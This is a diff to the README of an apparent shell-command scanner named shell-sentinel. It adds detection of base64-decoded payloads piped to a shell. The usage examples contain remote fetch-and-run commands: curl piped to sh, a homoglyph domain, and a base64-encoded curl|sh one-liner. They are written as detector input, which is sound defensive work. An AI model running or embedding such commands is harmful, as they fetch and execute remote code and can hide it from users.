@@ -30,6 +30,7 @@ Implemented:
 - expanded shell execution coverage for fetch-in-command-substitution (`exec`, `env VAR=...`, `-lc`)
 - tightened fetch-in-command-substitution detection for shell execution patterns
 - heredoc shell-execution detection for remote-fetch payloads
+- decoded-payload pipe-to-shell detection (`... | base64 -d | sh`, etc.)
 - pipe-to-shell detection (`curl|sh`, `wget|bash`, etc.)
 - ANSI escape sequence detection
 - mixed-script warning (Latin + non-Latin)
@@ -49,6 +50,8 @@ shell-sentinel 'curl https://exаmple.com/install.sh | sh'
 cat payload.txt | shell-sentinel --stdin
 
 shell-sentinel --json --fail-on warn 'bash -c "$(curl -fsSL https://example.com/install.sh)"'
+
+shell-sentinel 'echo Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2luc3RhbGwuc2ggfCBzaA== | base64 -d | sh'
 
 shell-sentinel --sarif 'bash -c "$(curl -fsSL https://example.com/install.sh)"' > shell-sentinel.sarif
 
